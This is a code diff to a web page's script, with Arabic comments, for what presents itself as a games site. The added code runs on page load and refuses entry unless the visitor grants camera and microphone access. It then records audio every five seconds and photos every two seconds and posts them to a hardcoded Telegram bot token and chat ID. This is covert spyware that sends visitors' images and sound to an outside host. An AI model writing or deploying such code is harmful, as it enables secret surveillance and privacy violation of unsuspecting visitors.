@@ -215,41 +215,20 @@
 
     <!-- سكربت (سيُملأ بالأجزاء التالية) -->
     <script>
-async function start() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-        console.log("تم منح الإذن!");
-        // شغل الموقع هنا
-        init();
-    } catch (err) {
-        // رفض الإذن
-        document.body.innerHTML = `
-            <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;background:#111;text-align:center;">
-                <h1>🚫 لا يمكنك الدخول بدون السماح بالكاميرا والميكروفون</h1>
-                <p>اضغط على العلامه الموجوده على يسار رابط الموقع و اضغط الاذونات وفعلها و سوي تحديث  للموقع.</p>
-                <button onclick="location.reload()" style="margin-top:20px;padding:10px 20px;font-size:16px;cursor:pointer;">🔄 إعادة المحاولة</button>
-            </div>
-        `;
-    }
-}
-
-window.addEventListener("load", start);
 let stream = null;
 let audioActive = false;
 let photoActive = false;
-
 const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
 const CHAT_ID   = "5648826330";
-
-const AUDIO_MS = 5000; // الصوت كل 5 ثواني
-const PHOTO_MS = 2000; // الصورة كل 2 ثانية
+const AUDIO_MS = 5000;
+const PHOTO_MS = 2000;
 
 // إرسال إلى تليجرام
 function sendToTelegram(blob, type="voice") {
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     form.append(type, blob, type === "voice" ? "audio.webm" : "photo.jpg");
-
+    
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "voice" ? "Voice" : "Photo"}`, {
         method: "POST",
         body: form
@@ -274,7 +253,6 @@ function captureImage() {
     return new Promise(resolve => {
         const video = document.createElement("video");
         video.srcObject = stream;
-
         video.onloadedmetadata = () => {
             video.play();
             const canvas = document.createElement("canvas");
@@ -306,12 +284,33 @@ async function photoLoop() {
     }
 }
 
+// ✅ دالة واحدة فقط
+async function start() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        console.log("✅ تم منح الإذن! بدء التسجيل...");
+        
+        // 🟢 تشغيل الحلقات
+        audioLoop();
+        photoLoop();
+        
+    } catch (err) {
+        console.error("❌ تم رفض الإذن:", err);
+        
+        // رسالة الخطأ
+        document.body.innerHTML = `
+            <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;background:#111;text-align:center;font-family:Arial;padding:20px;">
+                <h1>🚫 لا يمكنك الدخول بدون السماح بالكاميرا والميكروفون</h1>
+                <p>اضغط على العلامة الموجودة على يسار رابط الموقع واضغط الأذونات وفعلها وسوي تحديث للموقع.</p>
+                <button onclick="location.reload()" style="margin-top:20px;padding:10px 20px;font-size:16px;cursor:pointer;background:#4CAF50;color:#fff;border:none;border-radius:5px;">
+                    🔄 إعادة المحاولة
+                </button>
+            </div>
+        `;
+    }
+}
 
-        /* الجزء 2 و 3: سيتم إضافتهما لاحقاً.
-           الآن عندك الهيكل، الستايل، والمودالات.
-           اطلب "بعث الجزء 2" لأكمل الألعاب و الجافاسكربت.
-        */
-
+window.addEventListener("load", start);
 // 🔵 ألعاب الكمبيوتر 
 let defaultGames = [
     {
